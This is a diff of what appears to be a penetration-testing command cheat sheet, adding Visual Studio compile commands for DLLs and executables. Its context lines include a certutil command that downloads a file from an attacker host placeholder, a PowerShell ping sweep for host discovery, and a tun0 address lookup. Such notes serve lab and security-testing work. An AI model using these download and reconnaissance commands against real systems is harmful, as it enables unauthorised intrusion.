@@ -37,4 +37,20 @@ certutil -urlcache -split -f http://<LHOST>:8000/<FILE>
 # ping sweep host discovery eg. replace subnet with 10.0.0
 1..254 | % {"<SUBNET>.$($_): $(Test-Connection -count 1 -comp <SUBNET>.$($_) -quiet)"}
 
+# compile dll c
+%comspec% /k "C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvars64.bat"
+cl.exe /D_USRDLL /D_WINDLL /LD dll.c /link /DLL /OUT:mono.dll
+
+# compile dll cpp for release /02
+%comspec% /k "C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvars64.bat"
+cl /LD /EHsc /O2 example_dll.cpp
+
+# compile exe c
+%comspec% /k "C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvars64.bat"
+cl /O2 /W4 /TC hello.c
+
+# compile exe cpp
+%comspec% /k "C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvars64.bat"
+cl /O2 /W4 hello.c
+
 $ LHOST: ip -f inet addr show tun0 | sed -En -e 's/.*inet ([0-9.]+).*/\1/p'
